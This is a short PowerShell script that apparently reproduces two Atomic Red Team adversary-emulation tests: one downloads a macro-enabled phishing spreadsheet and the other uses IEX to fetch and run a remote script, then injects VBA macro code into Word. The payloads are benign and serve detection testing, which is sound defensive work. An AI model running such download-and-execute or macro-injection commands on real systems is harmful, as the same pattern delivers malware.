#Atomic Test 1 - Download Macro-Enabled Phishing Attachment

$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm

#Atomic Test 2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"


